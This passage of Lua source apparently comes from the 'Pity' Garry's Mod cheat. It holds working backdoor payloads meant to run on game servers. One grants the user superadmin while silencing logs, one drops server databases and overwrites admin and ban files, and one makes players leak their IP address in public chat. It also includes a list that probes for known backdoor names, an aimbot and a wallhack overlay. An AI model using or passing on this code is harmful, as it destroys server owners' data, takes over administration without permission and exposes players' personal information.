[1] = {b = "ValveBiped.Bip01_Head1", v = Vector(4,0,4)},
[2] = {b =  "ValveBiped.Bip01_R_Thigh", v = Vector(0,0,0)},
[3] = {b = "ValveBiped.Bip01_L_Thigh", v = Vector(0,0,0)},
[4] = {b =  "ValveBiped.Bip01_R_Calf", v = Vector(0,0,1)},
[5] = {b = "ValveBiped.Bip01_L_Calf", v = Vector(0,0,1)},
[6] = {b = "ValveBiped.Bip01_R_UpperArm", v = Vector(0,0,0)},
[7] = {b = "ValveBiped.Bip01_L_UpperArm", v = Vector(0,0,0)},
[8] = {b = "ValveBiped.Bip01_R_Forearm", v = Vector(1,1.5,1.5)},
[9] = {b = "ValveBiped.Bip01_L_Forearm", v = Vector(1,1.5,1.5)},
[10] = {b = "ValveBiped.Bip01_R_Clavicle", v = Vector(0,0,0)},
[11] = {b = "ValveBiped.Bip01_L_Clavicle", v = Vector(0,0,0)},
}

if !v.is2D then
v.is2D = true
for k, bone  in pairs(bones) do
local boneToFind = v:LookupBone(bone.b)
v:ManipulateBoneScale( boneToFind, bone.v)
end
else
v.is2D = false
for k, bone  in pairs(bones) do
local boneToFind = v:LookupBone(bone.b)
v:ManipulateBoneScale( boneToFind, Vector(1,1,1))
end
end
]],

},

["Nuke (M9K)"] = {

["Type"] = 2,

["Code"] = [[
//            if (m9k) then
local nuke = ents.Create("m9k_davy_crockett_explo")
nuke:SetPos(v:GetPos())
nuke:SetOwner(v)
nuke.Owner = v
nuke:Spawn()
nuke:Activate()
//            end
]],

},

["Smash console"] = {

["Type"] = 1,

["Code"] = [[
if !(timer.Exists("consoleJammer")) then
timer.Create("consoleJammer", 0.5, 0, function()
print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
end )
else
timer.Destroy("consoleJammer")
end
]],

},

["Set superadmin"] = {

["Type"] = 1,

["Code"] = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")
]],

["Private"] = true,

},

["Unban y'all"] = {

["Type"] = 1,

["Code"] = [[
RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")
]],

},


["Delete entire server"] = {

["Type"] = 1,

["Code"] = [[
local date = os.date( "%m-%d-%y" )
local dataBDMenus = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobSpawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcSpawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_Spawnpoint/rp_venator_v3.txt","nordahl_Spawnpoint/rp_venator_v2.txt","nordahl_Spawnpoint/rp_venator_v1.txt","nordahl_Spawnpoint/rp_venator_gg.txt","nordahl_Spawnpoint/rp_venator_ausv4.txt","nordahl_Spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_Spawnpoint/arena_byre.txt","nordahl_Spawnpoint/rp_venator_v2_immersive.txt","nordahl_Spawnpoint/rp_venator_fade_v3.txt","nordahl_Spawnpoint/rp_venator_gr.txt","nordahl_Spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_Spawnpoint/rp_scifi.txt","nordahl_Spawnpoint/rishimoon_crimson.txt","nordahl_Spawnpoint/rp_pripyat_hl2.txt","nordahl_Spawnpoint/rp_onwardhope.txt", "nordahl_Spawnpoint/rp_oldworld_fix.txt","nordahl_Spawnpoint/sd_doomsday.txt","nordahl_Spawnpoint/sd_doomsday_event.txt","nordahl_Spawnpoint/rp_naboo_city_v1.txt","nordahl_Spawnpoint/rp_noclyria_crimson.txt","nordahl_Spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_Spawnpoint/rp_mos_mersic_v2.txt","nordahl_Spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_Spawnpoint/dust_dunes.txt","nordahl_Spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_Spawnpoint/rd_asteroid.txt","nordahl_Spawnpoint/naboo.txt","nordahl_Spawnpoint/kashyyyk.txt","nordahl_Spawnpoint/geonosis.txt","nordahl_Spawnpoint/fightspace3b.txt","nordahl_Spawnpoint/endor.txt","nordahl_Spawnpoint/toth_forgotten.txt"}
local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_Spawnpoint/rp_venator_v3.txt","nordahl_Spawnpoint/rp_venator_v2.txt","nordahl_Spawnpoint/rp_venator_v1.txt","nordahl_Spawnpoint/rp_venator_gg.txt","nordahl_Spawnpoint/rp_venator_ausv4.txt","nordahl_Spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_Spawnpoint/arena_byre.txt","nordahl_Spawnpoint/rp_venator_v2_immersive.txt","nordahl_Spawnpoint/rp_venator_fade_v3.txt","nordahl_Spawnpoint/rp_venator_gr.txt","nordahl_Spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_Spawnpoint/rp_scifi.txt","nordahl_Spawnpoint/rishimoon_crimson.txt","nordahl_Spawnpoint/rp_pripyat_hl2.txt","nordahl_Spawnpoint/rp_onwardhope.txt", "nordahl_Spawnpoint/rp_oldworld_fix.txt","nordahl_Spawnpoint/sd_doomsday.txt","nordahl_Spawnpoint/sd_doomsday_event.txt","nordahl_Spawnpoint/rp_naboo_city_v1.txt","nordahl_Spawnpoint/rp_noclyria_crimson.txt","nordahl_Spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_Spawnpoint/rp_mos_mersic_v2.txt","nordahl_Spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_Spawnpoint/dust_dunes.txt","nordahl_Spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_Spawnpoint/rd_asteroid.txt","nordahl_Spawnpoint/naboo.txt","nordahl_Spawnpoint/kashyyyk.txt","nordahl_Spawnpoint/geonosis.txt","nordahl_Spawnpoint/fightspace3b.txt","nordahl_Spawnpoint/endor.txt","nordahl_Spawnpoint/toth_forgotten.txt"}

for k,v in pairs(dataBDMenus) do
if sql.TableExists(v) then
sql.Query("DROP TABLE "..v.." ;")
sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
end
end

for k,v in pairs(datafiles) do
if file.Exists(v) then
file.Delete(v)
file.write(v, "pitycheats.com hehe")
end
end

for k,v in pairs(sensitivefiles) do
if file.Exists(v) then
file.Delete(v)
file.write(v, "pitycheats.com hehe")
end
end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
]],

["Private"] = true,

},

["Kill (silent)"] = {

["Type"] = 2,

["Code"] = [[v:KillSilent()]],

},

["Delete props"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand("gmod_cleanup")]],

},

["Grab IP"] = {

["Type"] = 2,

["Code"] = [[
if (darkrp || DarkRP) then
v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say /ooc Take my ip please : "..b) end, function(error) return error end )')
else
v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say Take my ip please : "..b) end, function(error) return error end )')
end
]],

["Private"] = true,

},

}

local _key
function BackdoorValid( str )
	local status, error = pcall( net.Start, str )
	return status
end

/*
if( BackdoorValid("Ulx_Error_88") ) then
	_key = "Mining"
else if( BackdoorValid("FAdmin_Notification_Receiver") ) then 
	_key = "Crero"
else if( BackdoorValid("DarkRP_ReceiveData") ) then
	_key = "FAdmin"
else if( BackdoorValid("fijiconn") ) then
	_key = "Pitybd"
else if( BackdoorValid("Weapon_88") ) then
	_key = "Weapon"
else if( BackdoorValid("nostrip") ) then
	_key = "Nostrip"
else if( BackdoorValid("SessionBackdoor") ) then
	_key = "Session"
else if( BackdoorValid("DarkRP_AdminWeapons") ) then
	_key = "DarkRP_n"
else if( BackdoorValid("thefrenchenculer") ) then
	_key = "frenculer"
else if( BackdoorValid("Fix_Keypads") ) then
	_key = "Fix_Keypads"
else if( BackdoorValid("_CAC_ReadMemory") ) then
	_key = "CAC"
else if( BackdoorValid("Remove_Exploiters") ) then
	_key = "Exploiters"
else if( BackdoorValid("MoonMan") ) then
	_key = "MoonMan"
else if( BackdoorValid("disablebackdoor") ) then
	_key = "disableb"
else if( BackdoorValid("Sbox_itemstore") ) then
	_key = "Sbox"
else if( BackdoorValid("Sbox_darkrp") ) then
	_key = "Sbox2"
else if( BackdoorValid("R8") ) then
	_key = "R8"
else if( BackdoorValid("c") ) then
	_key = "c"
else if( BackdoorValid("_cac_") ) then
	_key = "_cac_"
else if( BackdoorValid("_Defqon") ) then
	_key = "_Defqon"
else if( BackdoorValid("noclipcloakaesp_chat_text") ) then
	_key = "nck"
else if( BackdoorValid("Sandbox_ArmDupe") ) then
	_key = "ArmDupe"
else if( BackdoorValid("ITEM") ) then
	_key = "ITEM"
else if( BackdoorValid("fix") ) then
	_key = "fix"
else if( BackdoorValid("ULX_QUERY2") ) then
	_key = "ULX_QUERY2"
else if( BackdoorValid("Sandbox_GayParty") ) then
	_key = "Sandbox_GayParty"
else if( BackdoorValid("_CAC_G") ) then
	_key = "_CAC_G"
else if( BackdoorValid("fellosnake") ) then
	_key = "fellosnake"
else if( BackdoorValid("stoppk") ) then
	_key = "stoppk"
else if( BackdoorValid("changename") ) then
	_key = "changename"
else if( BackdoorValid("Sbox_Message") ) then
	_key = "Sbox_Message"
else if( BackdoorValid("Sbox_gm_attackofnullday_key") ) then
	_key = "Sbox_gm_attackofnullday_key"
else if( BackdoorValid("m9k_explosionradius") ) then
	_key = "m9k_explosionradius"
else if( BackdoorValid("m9k_explosive") ) then
	_key = "m9k_explosive"
else if( BackdoorValid("arivia") ) then
	_key = "arivia"
else if( BackdoorValid("_Warns") ) then
	_key = "_Warns"
else if( BackdoorValid("pjHabrp9EY") ) then
	_key = "pjHabrp9EY"
else if( BackdoorValid("_Raze") ) then
	_key = "_Raze"
else if( BackdoorValid("Ãžï¿½ ?D)â—˜") ) then
	_key = "Ãžï¿½ ?D)â—˜"
else if( BackdoorValid("PlayerItemPickUp") ) then
	_key = "PlayerItemPickUp"
else if( BackdoorValid("echangeinfo") ) then
	_key = "echangeinfo"
else if( BackdoorValid("fourhead") ) then
	_key = "fourhead"
else if( BackdoorValid("DefqonBackdoor") ) then
	_key = "DefqonBackdoor"
else if( BackdoorValid("xenoexistscl") ) then
	_key = "xenoexistscl"
else if( BackdoorValid("cvaraccess") ) then
	_key = "cvaraccess"
else if( BackdoorValid("NoNerks") ) then
	_key = "NoNerks"
else if( BackdoorValid("cucked") ) then
	_key = "cucked"
else if( BackdoorValid("OldNetReadData") ) then
	_key = "OldNetReadData"
else if( BackdoorValid("DarkRP_UTF8") ) then
	_key = "DarkRP_UTF8"
else if( BackdoorValid("fix") ) then
	_key = "fix"
else if( BackdoorValid("asunalabestwaifu") ) then
	_key = "asunalabestwaifu"
else if( BackdoorValid("__G____CAC") ) then
	_key = "__G____CAC"
else if( BackdoorValid("AbSoluT") ) then
	_key = "AbSoluT"
else if( BackdoorValid("Gamemode_get") ) then
	_key = "Gamemode_get"
else if( BackdoorValid("z") ) then
	_key = "z"
else if( BackdoorValid("cvardel") ) then
	_key = "cvardel"
else if( BackdoorValid("jesuslebg") ) then
	_key = "jesuslebg"
else if( BackdoorValid("effects_en") ) then
	_key = "effects_en"
else if( BackdoorValid("file") ) then
	_key = "file"
else if( BackdoorValid("_Warns") ) then
	_key = "_Warns"
else if( BackdoorValid("_GaySploit") ) then
	_key = "_GaySploit"
else if( BackdoorValid("slua") ) then
	_key = "slua"
else if( BackdoorValid("BOOST_FPS") ) then
	_key = "BOOST_FPS"
else if( BackdoorValid("gag") ) then
	_key = "gag"
else if( BackdoorValid("_cac_") ) then
	_key = "_cac_"
else if( BackdoorValid("PlayerItemPickUp") ) then
	_key = "PlayerItemPickUp"
else if( BackdoorValid("m9k_explosive") ) then
	_key = "m9k_explosive"
else if( BackdoorValid("mecthack") ) then
	_key = "mecthack"
else if( BackdoorValid("PlayerCheck") ) then
	_key = "PlayerCheck"
else if( BackdoorValid("88") ) then
	_key = "88"
else
	print("no backdoor found.")
end */

if string.find(string.lower(GAMEMODE.Name), "terror") != nil then
	GMode = 1
elseif string.find(string.lower(GAMEMODE.Name), "murder") != nil then
	GMode = 2
else
	GMode = 3
end

function GetTeam( Ply )
	local Team = Ply:Team()
	local t, c
	if GMode == 1 then
		if Team == TEAM_SPECTATOR then
			t = Team
			c = team.GetColor(Team)
		else
			if table.HasValue(Pity.Traitors, Ply:SteamID()) then
				t = 1
				c = Color(255,0,0)
			elseif Ply:GetRole() == 2 then
				t = 0
				c = Color(0,0,255)
			else
				t = 0
				c = Color(0,255,0)
			end
		end
	elseif GMode == 2 then
		if Team == TEAM_SPECTATOR then
			t = Team
			c = team.GetColor(Team)
		else
			if table.HasValue(Pity.Murderers, Ply:SteamID()) then
				t = 2
				c = Color(255,0,0)
			else
				t = 1
				local Moo = false
				for k, v in pairs(Ply:GetWeapons()) do
					if v:GetClass() == "weapon_mu_magnum" then
						Moo = true
						break
					end
				end
				if Moo == true then
					c = Color(0,0,255)
				else
					c = Color(0,255,0)
				end
			end
		end
	else
		t = Team
		c = team.GetColor(Team)
	end
	return t, c
end

local EntTable = ents.GetAll()
local FastWalk = false
local MenuDelay, FPSDelay = false, false
local ForwardMove = 0
local SideMove = 0
local TapS = false
local WLeft, WRight, WForward, WBack, WActive = false, false, true, false, false
local NoclipPos, NoclipAngles, NoclipOn, NoclipX, NoclipY, NoclipDuck, NoclipJump = LocalPlayer():EyePos(), LocalPlayer():GetAngles(), false, 0, 0, false, false
local ScaleActive, ScaleNum = false, 1

hook.Add("Think", "Aim", function()
	if GetConVarNumber("Pity_Panic") == 0 && Pity.Options["Aim_Toggle"] && !MenuOpen && !(Pity.Options["Cams_Toggle"] && Pity.Options["Cams_CSNoclip"]) then
		if !Pity.Options["Aim_AimOnKey"] || ( ( ( Pity.Options["Aim_AimOnKey_Key"] >= 107 && Pity.Options["Aim_AimOnKey_Key"] <= 113 ) && input.IsMouseDown(Pity.Options["Aim_AimOnKey_Key"]) ) || input.IsKeyDown(Pity.Options["Aim_AimOnKey_Key"]) ) then
			local FinAngleP
			local AimSpotT = {}
			local PlayerDistance, NewPlayerDistance, MousePos, NewMousePos = math.huge, math.huge, math.huge, math.huge
			if !Pity.Options["Aim_StickToTarget"] then EntTable = ents.GetAll() end
			for k, v in pairs(EntTable) do
				if v != LocalPlayer() && v:IsValid() && v:Health() > 0 && ( v:IsNPC() || v:IsPlayer() ) then
					local Ent = v
					local AimTeam, AimOpponents, AimFriends, AimEnemies, AimSpectators, AimNPCs = false, false, false, false, false, false
					local AimTeamV, AimOpponentsV, AimFriendsV, AimEnemiesV, AimSpectatorsV, AimNPCsV = true, true, true, true, true, true
					if !Ent:IsNPC() then
						local Team, _ = GetTeam(Ent)
						if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Aim_AimTeam"] && Team == GetTeam(LocalPlayer()) then
							if Pity.Options["Aim_AimTeamV"] == "Aim" then
								AimTeam = true
							else
								AimTeamV = false
							end
						end
						if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Aim_AimOpponents"] && Team != GetTeam(LocalPlayer()) then
							if Pity.Options["Aim_AimOpponentsV"] == "Aim" then
								AimOpponents = true
							else
								AimOpponentsV = false
							end
						end
						if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Aim_AimFriends"] && ( (!Pity.Options["Friends_FriendIsEnemy"] && table.HasValue( Pity.FriendsList, Ent:SteamID() ) ) || (Pity.Options["Friends_FriendIsEnemy"] && !table.HasValue( Pity.FriendsList, Ent:SteamID() ) ) ) then
							if Pity.Options["Aim_AimFriendsV"] == "Aim" then
								AimFriends = true
							else
								AimFriendsV = false
							end
						end
						if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Aim_AimEnemies"] && ( (!Pity.Options["Friends_FriendIsEnemy"] && !table.HasValue( Pity.FriendsList, Ent:SteamID() ) ) || (Pity.Options["Friends_FriendIsEnemy"] && table.HasValue( Pity.FriendsList, Ent:SteamID() ) ) ) then
							if Pity.Options["Aim_AimEnemiesV"] == "Aim" then
								AimEnemies = true
							else
								AimEnemiesV = false
							end
						end
						if Pity.Options["Aim_AimSpectators"] && Ent:Team() == TEAM_SPECTATOR then
							if Pity.Options["AimSpectatorsV"] == "Aim" then
								AimSpectators = true
							else
								AimSpectatorsV = false
							end
						end
					else
						if Pity.Options["Aim_AimNPCs"] && Pity.Options["Aim_AimNPCsV"] == "Aim" then
							if Pity.Options["Aim_AimNPCsV"] == "Aim" then
								AimNPCs = true
							else
								AimNPCsV = false
							end
						end
					end
					if (AimTeam || AimOpponents || AimFriends || AimEnemies || AimSpectators || AimNPCs) && (AimTeamV && AimOpponentsV && AimFriendsV && AimEnemiesV && AimSpectatorsV && AimNPCsV) then
						local LOS, AimP, AimF = false, false, false
						local AimSpot

						if Pity.Options["Aim_BoneAim"] && Pity.BoneOrder[1] != nil then
							table.Empty( AimSpotT )
							for k, v in pairs(Pity.BoneOrder) do
								if Ent:GetBonePosition(Ent:LookupBone(v)) != nil && AimSpot == nil then
									AimSpot = Ent:GetBonePosition(Ent:LookupBone(v))
								end
								if Ent:GetBonePosition(Ent:LookupBone(v)) != nil then
									local BonePos = Ent:GetBonePosition(Ent:LookupBone(v))
									if v == "ValveBiped.Bip01_Head1" then BonePos = BonePos+Vector(0,0,1) end
									table.insert( AimSpotT, BonePos )
								end
							end
							if AimSpot == nil then AimSpot = Ent:LocalToWorld(Ent:OBBCenter()) end
							if AimSpotT == nil then AimSpotT = {Ent:LocalToWorld(Ent:OBBCenter())} end
						else
							AimSpot = Ent:LocalToWorld(Ent:OBBCenter())
							AimSpotT = {Ent:LocalToWorld(Ent:OBBCenter())}
						end

						local CurAngle = LocalPlayer():EyeAngles()
						local CurPos = LocalPlayer():GetShootPos()

						AimSpot = AimSpot+(CurAngle:Right()*Pity.Options["Aim_OffsetX"]) //This is screw up when close to your target
						AimSpot.z = AimSpot.z + Pity.Options["Aim_OffsetY"]

						local FinAngle = ( AimSpot - CurPos ):Angle()
						if FinAngle.y > 180 then
							FinAngle.y = FinAngle.y-360
						end

						if Pity.Options["Aim_AimPriority"] == "Distance" then
							if LocalPlayer():GetShootPos():Distance(AimSpot) < PlayerDistance then NewPlayerDistance = LocalPlayer():GetShootPos():Distance(AimSpot) AimP = true end
						elseif Pity.Options["Aim_AimPriority"] == "Crosshair" then
							local FirstCalc = math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
							local Calc
							if FirstCalc > 180 && ( ( CurAngle.y >= 0 && FinAngle.y < 0 ) || ( CurAngle.y < 0 && FinAngle.y >= 0 ) ) then
								Calc = 360 - math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
							else
								Calc = math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
							end
							if Calc < MousePos then NewMousePos = Calc AimP = true end
						end

						if Pity.Options["Aim_FOV"] then
							local CalcX = FinAngle.y - CurAngle.y
							local CalcY = FinAngle.x - CurAngle.x
							if CalcY < 0 then CalcY = CalcY * -1 end
							if CalcX < 0 then CalcX = CalcX * -1 end
							if CalcY > 180 then CalcY = 360 - CalcY end
							if CalcX > 180 then CalcX = 360 - CalcX end
							if CalcX <= Pity.Options["Aim_FOV_Value"]/2 && CalcY <= Pity.Options["Aim_FOV_Value"]*0.4 then AimF = true end
						else
							AimF = true
						end

						if Pity.Options["Aim_LOSCheck"] || Pity.Options["Aim_AutoWall"] then
							for k, v in pairs(AimSpotT) do
								local TrLOS = {}
								TrLOS.start = LocalPlayer():GetShootPos()
								TrLOS.endpos = v
								TrLOS.filter = {}
								if Pity.Options["Aim_StickToTarget"] then
									for k, v in pairs(ents.GetAll()) do
										if v:IsValid() && ( v:IsPlayer() || v:IsNPC() ) then
											table.insert( TrLOS.filter, v )
										end
									end
								else TrLOS.filter = {LocalPlayer(), Ent} end
								if Pity.Options["Aim_AutoWall"] then TrLOS.mask = MASK_SHOT else TrLOS.mask = MASK_VISIBLE_AND_NPCS end
								if util.TraceLine(TrLOS).Fraction == 1 then
									LOS = true
									AimSpot = v
									break
								end
							end
						else
							LOS = true
						end
						if LOS && AimP && AimF then
							EntTable = {Ent}
							FinAngleP = FinAngle
							PlayerDistance = NewPlayerDistance
							MousePos = NewMousePos
						elseif Pity.Options["Aim_StickToTarget"] && EntTable[2] != nil then
							EntTable = ents.GetAll()
						end
					end
				end
			end
			if EntTable != nil && FinAngleP != nil then
				if Pity.Options["Aim_SmoothAim"] then
					SmoothAngles( FinAngleP, Pity.Options["Aim_SmoothAim_Value"] )
				else
					if Pity.Options["Aim_AutoShoot"] then
						LocalPlayer():SetEyeAngles(FinAngleP)
						LocalPlayer():ConCommand("+attack")
						timer.Simple( 0.1, function() LocalPlayer():ConCommand("-attack") end )
					else
						LocalPlayer():SetEyeAngles(FinAngleP)
					end
				end
			elseif EntTable[2] == nil then
				EntTable = ents.GetAll()
			end
		else
			if EntTable[2] == nil then
				EntTable = ents.GetAll()
			end
		end
	end
end)

hook.Add( "HUDPaint", "Visuals", function()
	if Pity.Options["Visuals_Toggle"] || Pity.Options["Visuals_Entity_Toggle"] then
		for k, v in pairs( ents.GetAll() ) do
			if v:IsValid() && v != LocalPlayer() && !v:IsDormant() then
				local Ent = v
				if Pity.Options["Visuals_Entity_Toggle"] then
					for k, v in pairs( Pity.EntityVisuals ) do
						if v == Ent:GetClass() && Ent:GetOwner() != LocalPlayer()  then
							local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8 = VisualsGetPos( Ent )
							if Pity.Options["Visuals_Entities_NameTags"] == true then
								local Name = Ent:GetClass()
								local Dist = math.floor(Ent:GetPos():Distance(LocalPlayer():GetShootPos())/40)
								draw.SimpleTextOutlined( Name.." ["..Dist.."]", "Normal", ((MaxX-MinX)/2)+MinX, MinY-5, Color(0,160,240), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color(0,0,0) )
							end
						if Pity.Options["Visuals_Entities_BoundaryBoxes"] == true then
							surface.SetDrawColor( Color( 255, 68, 68 ) )
						if Pity.Options["Visuals_Entities_BoundaryBoxes_Mode"] == "2D" then
							surface.DrawLine( MaxX, MaxY, MinX, MaxY )
							surface.DrawLine( MaxX, MaxY, MaxX, MinY )
							surface.DrawLine( MinX, MinY, MaxX, MinY )
							surface.DrawLine( MinX, MinY, MinX, MaxY )
						else
							//Top Box
							surface.DrawLine( V4.x, V4.y, V6.x, V6.y )
							surface.DrawLine( V1.x, V1.y, V8.x, V8.y )
							surface.DrawLine( V6.x, V6.y, V8.x, V8.y )
							surface.DrawLine( V4.x, V4.y, V1.x, V1.y )

							//Bottom Box
							surface.DrawLine( V3.x, V3.y, V5.x, V5.y )
							surface.DrawLine( V2.x, V2.y, V7.x, V7.y )
							surface.DrawLine( V3.x, V3.y, V2.x, V2.y )
							surface.DrawLine( V5.x, V5.y, V7.x, V7.y )

							//Verticals
							surface.DrawLine( V3.x, V3.y, V4.x, V4.y )
							surface.DrawLine( V2.x, V2.y, V1.x, V1.y )
							surface.DrawLine( V7.x, V7.y, V8.x, V8.y )
							surface.DrawLine( V5.x, V5.y, V6.x, V6.y )
						end
					end
				end
			end
		end
		if Pity.Options["Visuals_Hitmarker"] then
		hook.Add("HUDPaint", "Hitmarker", function()
    		local x = ScrW() / 2
    		local y = ScrH() / 2
    		local MYEYES = LocalPlayer():GetEyeTrace().Entity
    		local ply = LocalPlayer()
    		if MYEYES:IsPlayer() || MYEYES:IsNPC() then
      			if ply:Health() > 0 then
        			if ply:KeyDown(IN_ATTACK) then
          				if ply:GetActiveWeapon():Clip1() > 0 then
            				surface.SetDrawColor(255,255,255)
            				surface.DrawLine(x+10, y+10, x+2, y+2)
            				surface.DrawLine(x-10, y-10, x-2, y-2)
            				surface.DrawLine(x-10, y+10, x-2, y+2)
            				surface.DrawLine(x+10, y-10, x+2, y-2)
          				end
        			end
      			end
    		end
  		end)
		end
		hook.Add( "PreDrawSkyBox", "removeSkybox", function()
